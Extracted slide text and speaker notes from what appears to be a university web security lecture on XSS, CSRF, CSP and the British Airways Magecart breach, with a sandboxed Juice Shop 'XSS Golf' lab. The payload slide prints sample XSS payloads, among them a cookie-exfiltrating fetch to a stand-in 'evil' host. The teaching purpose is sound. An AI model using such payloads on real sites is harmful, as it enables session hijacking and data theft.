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pop an alert(1) on a real site clone, then show the same payload exfiltrating a cookie. "XSS is injection that runs in YOUR browser, as the site you trust."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Frame: last week injection hit the server (SQL); this week it hits the client (the DOM). Same root cause, different interpreter (the browser).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1-min bridge. The interpreter today is the browser's HTML/JS parser. Ask: "what was the one fix for SQLi?" then say: the XSS analogue is context-aware output encoding.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Foundational — XSS is dangerous precisely because injected script runs INSIDE the origin, so SOP protects the attacker's code, not you. Give an origin example: https://a.com:443 vs http://a.com differ.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Drive home: because the script runs as the site, it can do anything the user can. List concrete harms. "Output side" = the bug is in how we render data, not how we store it.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row by row with an example each: reflected = malicious link; stored = a comment that attacks every viewer (worst); DOM = `location.hash` written to innerHTML. Ask which is most dangerous and why (stored — hits everyone).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XSS Golf payloads. Explain why `&lt;img onerror&gt;` works when `&lt;script&gt;` is filtered, and why `"&gt;` breaks out of an attribute first. The context point is the key learning — the same data needs different encoding in each place.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with XSS: CSRF needs no script on the page — it abuses the browser auto-attaching cookies. Example: a hidden form that POSTs a transfer. SameSite cookies break the auto-send.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it real. Magecart = the keylogging harm from 2 slides ago, at scale, on a Fortune-500 checkout. Note it often enters via a compromised third-party script — which motivates CSP next.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reference for the worksheet.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payoff. #1: encode for the OUTPUT CONTEXT (the bug is on output). Modern frameworks auto-escape — the danger is when devs opt out (innerHTML). CSP is defense-in-depth: even if a payload lands, the browser refuses to run it.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before lab: golf = fewest characters → forces real understanding of contexts. Round 2 (defend) is the graded part. The "break a classmate's CSP" bonus teaches that CSP is hard to get right.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Logistics. Cookie theft must hit only the sandbox collector, not a real site (ethics). Step 3-4 (defend) are graded. Q6 of the quiz asks for their own scoring payload + the sink it hit.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Before/after + the reasoning note. Remind the AI-resilient tasks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Cold-call: "where is the XSS bug — input or output?" (output rendering).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— change one number in a URL and read someone else's data; forge a token and become admin." Remind Juice Shop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5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XSS &amp; Client-Side Risks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security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XSS: reflected / stored / DOM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+ SameSite cookies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Security Policy (CSP)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XSS Golf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Week 4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= data interpreted as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Parameterized queries fix SQLi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 returns today — in the browser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security model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Same-Origin Policy (SOP): scripts only read data from same origin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 = scheme + host + port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Cookies, DOM, storage scoped per origin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XSS = injection into the page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JavaScript runs in the victim's browser, in the site's origin.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13432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423160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Steal cookies/sessions, keylog, rewrite the page, pivot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 OWASP A05:2025 Injection (output side)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flavors of XSS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Type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Where the payload lives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Reflected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in the request, echoed back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Stored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saved server-side, served to others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DOM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client-side JS writes untrusted data to the DOM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payloads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042416"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5263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&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;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&lt;img src=x onerror=alert(1)&gt;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"&gt;&lt;svg onload=alert(1)&gt;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532888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642616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matters: HTML body vs attribute vs JS vs URL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CSRF — riding the user's session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auto-sends cookies → attacker forges a state-changing request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Defenses: anti-CSRF tokens, SameSite cookies, check Origin/Referer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Real-world: British Airways (2018)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Attackers injected malicious JS (Magecart) into BA's site/app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skimmed credit-card details as users typed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400,000 customers affected; £183M ICO fine (later reduced)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697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injection = real money + real fines.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CWE mapping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CWE-79 — Cross-site scripting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CWE-352 — CSRF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CWE-1021 — improper restriction of rendered UI (clickjacking)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encoding per context (HTML/attr/JS/URL)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auto-escaping (don't bypass with innerHTML/dangerouslySetInnerHTML)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Security Policy — block inline/3rd-party scripts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HttpOnly + SameSite cookies; anti-CSRF tokens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⛳ Game — XSS Golf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 the shortest payload that pops alert(1) / steals a cookie in Juice Shop.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07568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Leaderboard by character count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deploy a CSP + escaping that blocks every submitted payload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break a classmate's CSP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steps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Worksheet 5 — labs/week05-xss-client-side/worksheet.md (Part 3) · kickoff: docker compose up → http://localhost:5000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2313432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051560" y="2313432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reflected + stored + DOM XSS in Juice Shop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02920" y="2770632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051560" y="2770632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cookie theft (sandbox)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02920" y="3227832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" y="3227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051560" y="3227832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output encoding + a strict CSP header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02920" y="3685032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051560" y="3685032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CSRF and its defense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2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XSS type with payload + context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 + escaping that blocks them (show before/after)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note: why SameSite + tokens stop CSRF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is injection on the output side — encode for the context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 is defense-in-depth, not a substitute for encoding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SameSite cookies kill most CSRF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Authentication, sessions &amp; access control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5</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Nutthakorn Chalaemwongwan</dc:creator>
  <cp:lastModifiedBy>Nutthakorn Chalaemwongwan</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-06-28T13:20:39Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-28T13:20:39Z</dcterms:modified>
</cp:coreProperties>
</file>